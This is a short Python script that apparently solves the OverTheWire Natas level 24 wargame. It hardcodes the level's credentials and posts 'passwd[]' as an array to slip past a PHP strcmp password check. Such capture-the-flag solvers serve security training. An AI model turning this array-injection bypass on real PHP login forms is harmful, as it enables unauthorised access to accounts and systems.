#! /usr/bin/env python

import requests
import re

usn = 'natas24'
url = 'http://%s.natas.labs.overthewire.org/' % usn
passwd = 'OsRmXFguozKpTZZ5X14zNO43379LZveg'
login = (usn, passwd)

request = requests.Session()
def get_source_code():
  connection = request.get(url, auth=login, allow_redirects = False)
  pageContent = connection.text
  print pageContent;


def solve_lab():
  connection = request.post(url, data = {'passwd[]':'anything'}, auth = login)
  pageContent = connection.text 
  print pageContent